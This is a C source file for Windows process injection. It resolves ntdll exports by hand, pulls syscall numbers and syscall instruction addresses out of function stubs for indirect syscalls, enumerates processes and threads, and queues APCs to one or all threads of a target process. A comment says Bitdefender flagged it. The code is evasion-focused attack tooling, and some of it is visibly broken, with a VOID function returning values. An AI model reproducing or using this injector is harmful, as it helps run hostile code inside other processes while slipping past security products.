#include "apc.h"



//  Flagged by bitdefender Advanced threat defense for sum reason, maybe parsing too much idk
FARPROC GetProcAddressManualEx(HMODULE hMod, const char* name) {
	if (!hMod || !name) return NULL;
	unsigned char* base = (unsigned char*)hMod;
	IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)base;
	if (dos->e_magic != IMAGE_DOS_SIGNATURE) return NULL;
	IMAGE_NT_HEADERS64* nt64 = (IMAGE_NT_HEADERS64*)(base + dos->e_lfanew);
	if (nt64->Signature != IMAGE_NT_SIGNATURE) return NULL;
	BOOL is64 = FALSE;
	WORD magic = *(WORD*)&nt64->OptionalHeader.Magic;
	if (magic == IMAGE_NT_OPTIONAL_HDR64_MAGIC) is64 = TRUE;

	IMAGE_DATA_DIRECTORY expDir;
	if (is64) {
		IMAGE_NT_HEADERS64* nt = (IMAGE_NT_HEADERS64*)(base + dos->e_lfanew);
		expDir = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
	} else {
		IMAGE_NT_HEADERS32* nt = (IMAGE_NT_HEADERS32*)(base + dos->e_lfanew);
		expDir = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
	}

	if (expDir.VirtualAddress == 0 || expDir.Size == 0) return NULL;
	if ((SIZE_T)expDir.VirtualAddress >= (SIZE_T)0x10000000) return NULL; // cheap sanity
	IMAGE_EXPORT_DIRECTORY* exp = (IMAGE_EXPORT_DIRECTORY*)(base + expDir.VirtualAddress);
	if (!exp) return NULL;
	DWORD* nameRvas = (DWORD*)(base + exp->AddressOfNames);
	WORD* ordinals = (WORD*)(base + exp->AddressOfNameOrdinals);
	DWORD* funcRvas = (DWORD*)(base + exp->AddressOfFunctions);

	for (DWORD i = 0; i < exp->NumberOfNames; ++i) {
		char* exportName = (char*)(base + nameRvas[i]);
		if (!exportName) continue;
		if (strcmp(exportName, name) == 0) {
			WORD ordinalIndex = ordinals[i]; // index into AddressOfFunctions
			DWORD funcRva = funcRvas[ordinalIndex];
			if (funcRva == 0) return NULL;
			if (funcRva >= expDir.VirtualAddress && funcRva < expDir.VirtualAddress + expDir.Size) { return NULL; }
			return (FARPROC)(base + funcRva);
		}
	}
	return NULL;
}
FARPROC GetProcAddressManual(HMODULE hMod, const char* name) {
	if (!hMod || !name) return NULL;
	unsigned char* base = (unsigned char*)hMod;
	IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)base;
	if (dos->e_magic != IMAGE_DOS_SIGNATURE) return NULL;
	IMAGE_NT_HEADERS* nt = (IMAGE_NT_HEADERS*)(base + dos->e_lfanew);
	if (nt->Signature != IMAGE_NT_SIGNATURE) return NULL;

	IMAGE_DATA_DIRECTORY expDir = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
	if (expDir.VirtualAddress == 0 || expDir.Size == 0) return NULL; // locating img data dir, contains functions
	IMAGE_EXPORT_DIRECTORY* exp = (IMAGE_EXPORT_DIRECTORY*)(base + expDir.VirtualAddress);
	DWORD* nameRvas = (DWORD*)(base + exp->AddressOfNames);
	WORD* ordinals = (WORD*)(base + exp->AddressOfNameOrdinals);
	DWORD* funcRvas = (DWORD*)(base + exp->AddressOfFunctions);

	for (DWORD i = 0; i < exp->NumberOfNames; ++i) {
		char* exportName = (char*)(base + nameRvas[i]);
		if (exportName && strcmp(exportName, name) == 0) {
			WORD ordinal = ordinals[i];   // index into AddressOfFunctions
			DWORD funcRva = funcRvas[ordinal];
			if (funcRva == 0) return NULL;
			FARPROC addr = (FARPROC)(base + funcRva);  // getting the actual function address
			// forwarded exports 
			if ((DWORD)(funcRva) >= expDir.VirtualAddress && (DWORD)(funcRva) < expDir.VirtualAddress + expDir.Size) { return NULL; }
			return addr;
		}
	}
	return NULL;
}


VOID IndirectPrelude(_In_ HMODULE NtdllHandle, _In_ LPCSTR NtFunctionName, _Out_ PDWORD NtFunctionSSN, _Out_ PUINT_PTR NtFunctionSyscall) {
	UINT_PTR NtFunctionAddress = 0;
	NtFunctionAddress = (UINT_PTR)GetProcAddressManualEx(NtdllHandle, NtFunctionName);
	if (0 == NtFunctionAddress) {
		printf("GetProcAddress failed, error: 0x%lx", GetLastError());
		return;
	}

	unsigned char* p = (unsigned char*)NtFunctionAddress;
	const size_t maxScan = 64;
	BOOL foundMov = FALSE;
	DWORD ssn = 0;
	size_t movOffset = 0;
	for (size_t i = 0; i + 5 <= maxScan; ++i) {  // scan until we find mov eax (b8 imm32) opcode
		if (p[i] == 0xB8) {
			ssn = *(DWORD*)(p + i + 1);      // read full 4 byte immediate (little-endian) ssn
			foundMov = TRUE;
			movOffset = i;
			break;
		}
	}
	if (!foundMov) { fprintf(stderr, "GetSyscallInfo: mov eax imm32 not found for %s\n", NtFunctionName);
		return FALSE;
	} else { *NtFunctionSSN = ssn; }


	BOOL foundSyscall = FALSE;
	UINT_PTR syscallAddr = 0;
	for (size_t i = movOffset; i + 2 <= maxScan; ++i) {
		if (p[i] == 0x0F && p[i + 1] == 0x05) {		// asm "syscall" instruction
			syscallAddr = (UINT_PTR)(p + i);
			foundSyscall = TRUE;
			break;
		}
	}
	if (!foundSyscall) {  // scan from the very start again as a fallback
		for (size_t i = 0; i + 2 <= maxScan; ++i) {
			if (p[i] == 0x0F && p[i + 1] == 0x05) {
				syscallAddr = (UINT_PTR)(p + i);
				foundSyscall = TRUE;
				break;
			}
		}
	}
	if (!foundSyscall) {
		fprintf(stderr, "GetSyscallInfo: syscall opcode (0x0F05) not found for %s\n", NtFunctionName);
		return FALSE;
	} else { *NtFunctionSyscall = syscallAddr; }

	//UCHAR SyscallOpcodes[2] = { 0x0F, 0x05 };  // final check if we hooked a syscall instruction
	//if (!(memcmp(SyscallOpcodes, (PVOID)*NtFunctionSyscall, sizeof(SyscallOpcodes)) == 0)) {
	//	printf("expected syscall signature: \"0x0f05\" didn't match.");
	//	return FALSE; }

	printf(" %s : 0x%08X, %p\n", NtFunctionName, ssn, (void*)syscallAddr);
	return TRUE;
}


BOOL InitNtFunctions(void) {
	HMODULE ntdll = GetModuleHandleA("ntdll.dll");
	if (!ntdll) return FALSE;

	IndirectPrelude(ntdll, "NtOpenProcess", &h_NtOpenProcessSSN, &h_NtOpenProcessSyscall);
	IndirectPrelude(ntdll, "NtAllocateVirtualMemory", &h_NtAllocateVirtualMemorySSN, &h_NtAllocateVirtualMemorySyscall);
	IndirectPrelude(ntdll, "NtWriteVirtualMemory", &h_NtWriteVirtualMemorySSN, &h_NtWriteVirtualMemorySyscall);
	IndirectPrelude(ntdll, "NtProtectVirtualMemory", &h_NtProtectVirtualMemorySSN, &h_NtProtectVirtualMemorySyscall);
	IndirectPrelude(ntdll, "NtWaitForSingleObject", &h_NtWaitForSingleObjectSSN, &h_NtWaitForSingleObjectSyscall);
	IndirectPrelude(ntdll, "NtFreeVirtualMemory", &h_NtFreeVirtualMemorySSN, &h_NtFreeVirtualMemorySyscall);
	IndirectPrelude(ntdll, "NtClose", &h_NtCloseSSN, &h_NtCloseSyscall);
	IndirectPrelude(ntdll, "NtQuerySystemInformation", &h_NtQuerySystemInformationSSN, &h_NtQuerySystemInformationSyscall);
	IndirectPrelude(ntdll, "NtOpenThread", &h_NtOpenThreadSSN, &h_NtOpenThreadSyscall);
	IndirectPrelude(ntdll, "NtQueueApcThread", &h_NtQueueApcThreadSSN, &h_NtQueueApcThreadSyscall);

	return TRUE;
}




BOOL GetProcessNative(LPCWSTR processName, DWORD* outPid) {
	ULONG bufSize = 0x10000; // 64kb for proc info
	PBYTE buffer = NULL;
	NTSTATUS status;
	ULONG retLen = 0;

	for (;;) {
		buffer = (PBYTE)HeapAlloc(GetProcessHeap(), 0, bufSize);
		if (!buffer) return FALSE;
		status = NtQuerySystemInformation(SystemProcessInformation, buffer, bufSize, &retLen);
		if (NT_SUCCESS(status)) break;

		HeapFree(GetProcessHeap(), 0, buffer);
		if (status == STATUS_INFO_LENGTH_MISMATCH) {
			bufSize *= 2;
			continue;
		}

		printf("NtQuerySystemInformation : 0x%08X\n", (unsigned)status);
		return FALSE;
	}

	PBYTE current = buffer;
	while (current) {
		PSYSTEM_PROCESS_INFORMATION spi = (PSYSTEM_PROCESS_INFORMATION)current;
		if (spi->ImageName.Buffer && spi->ImageName.Length > 0) {
			int len = spi->ImageName.Length / sizeof(WCHAR); // convert length (in bytes) to wchar

			if (_wcsnicmp(spi->ImageName.Buffer, processName, len) == 0
				&& spi->ImageName.Buffer[len] == L'\0') { // compare case insensitively
				*outPid = (DWORD)(ULONG_PTR)spi->UniqueProcessId;
				HeapFree(GetProcessHeap(), 0, buffer);
				return TRUE;
			}
		} else { /*imageName.buffer = NULL often means System/kernel process, so we skip */ }

		if (spi->NextEntryOffset == 0) break;
		current += spi->NextEntryOffset;
	}
	HeapFree(GetProcessHeap(), 0, buffer);
	return FALSE;
}
BOOL GetThreadNative(DWORD pid, DWORD* outTid) {
	if (!outTid) return FALSE;

	ULONG bufSize = 0x10000;
	PBYTE buffer = NULL;
	NTSTATUS status;
	ULONG retLen = 0;

	for (;;) {
		buffer = (PBYTE)HeapAlloc(GetProcessHeap(), 0, bufSize);
		if (!buffer) return FALSE;

		status = NtQuerySystemInformation(SystemProcessInformation, buffer, bufSize, &retLen);
		if (NT_SUCCESS(status)) break;

		HeapFree(GetProcessHeap(), 0, buffer);
		if (status == STATUS_INFO_LENGTH_MISMATCH) {
			bufSize *= 2;
			continue;
		}
		return FALSE;
	}

	PBYTE current = buffer;
	while (current) {
		PSYSTEM_PROCESS_INFORMATION spi = (PSYSTEM_PROCESS_INFORMATION)current;
		if ((DWORD)(ULONG_PTR)spi->UniqueProcessId == pid) {
			for (ULONG i = 0; i < spi->NumberOfThreads; ++i) {

				PSYSTEM_THREAD_INFORMATION th = &spi->Threads[i];
				if (th->ClientId.UniqueThread) {
					*outTid = (DWORD)(ULONG_PTR)th->ClientId.UniqueThread;
					HeapFree(GetProcessHeap(), 0, buffer);
					return TRUE;
				}
			}
			// if no threads or no valid ClientId, break
			break;
		}
		if (spi->NextEntryOffset == 0) break;
		current += spi->NextEntryOffset;
	}

	HeapFree(GetProcessHeap(), 0, buffer);
	return FALSE;
}


// All threads
BOOL NativeShotgunAPC(DWORD targetPid, PVOID apcRoutine) {
	ULONG bufSize = 0x20000;
	PBYTE buffer = NULL;
	NTSTATUS status;

	while (TRUE) {
		buffer = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, bufSize);
		if (!buffer) return FALSE;

		status = NtQuerySystemInformation(SystemProcessInformation, buffer, bufSize, NULL);
		if (status == STATUS_INFO_LENGTH_MISMATCH) {
			HeapFree(GetProcessHeap(), 0, buffer);
			bufSize *= 2;
			continue;
		}
		break;
	}

	if (!NT_SUCCESS(status)) {
		if (buffer) HeapFree(GetProcessHeap(), 0, buffer);
		return FALSE;
	}

	ULONG apcCount = 0;
	PBYTE current = buffer;

	while (current) {
		PSYSTEM_PROCESS_INFORMATION spi = (PSYSTEM_PROCESS_INFORMATION)current;

		if ((DWORD_PTR)spi->UniqueProcessId == (DWORD_PTR)targetPid) {
			for (ULONG i = 0; i < spi->NumberOfThreads; i++) {
				PSYSTEM_THREAD_INFORMATION th = &spi->Threads[i];
				// Skip threads with no ID or that are terminating
				if (th->ClientId.UniqueThread == NULL) continue;

				HANDLE hThread = NULL;
				OBJECT_ATTRIBUTES obja;
				InitializeObjectAttributes(&obja, NULL, 0, NULL, NULL);
				CLIENT_ID cid = { (HANDLE)spi->UniqueProcessId, th->ClientId.UniqueThread };
				status = NtOpenThread(&hThread, THREAD_SET_CONTEXT | THREAD_QUERY_INFORMATION | SYNCHRONIZE, &obja, &cid);

				if (NT_SUCCESS(status)) {
					status = NtQueueApcThread(hThread, (PPS_APC_ROUTINE)apcRoutine, NULL, NULL, NULL);
					if (NT_SUCCESS(status)) { apcCount++; } NtClose(hThread);
				}
			} break;
		}
		if (spi->NextEntryOffset == 0) break;
		current += spi->NextEntryOffset;
	}
	HeapFree(GetProcessHeap(), 0, buffer);
	return (apcCount > 0);
}

// Single Thread
BOOL NtAPCinject(IN HANDLE hThread, IN PVOID pAddress) {
	NTSTATUS status = NtQueueApcThread(hThread, (PPS_APC_ROUTINE)pAddress, NULL, NULL, NULL);

	if (status != STATUS_SUCCESS) {
		printf("NtQueueApcThread failed. Status: 0x%08X\n", status); NtClose(hThread); return FALSE;
	} else printf("ok,");
	NtClose(hThread);
	// printf("End sium");
	return TRUE;
}

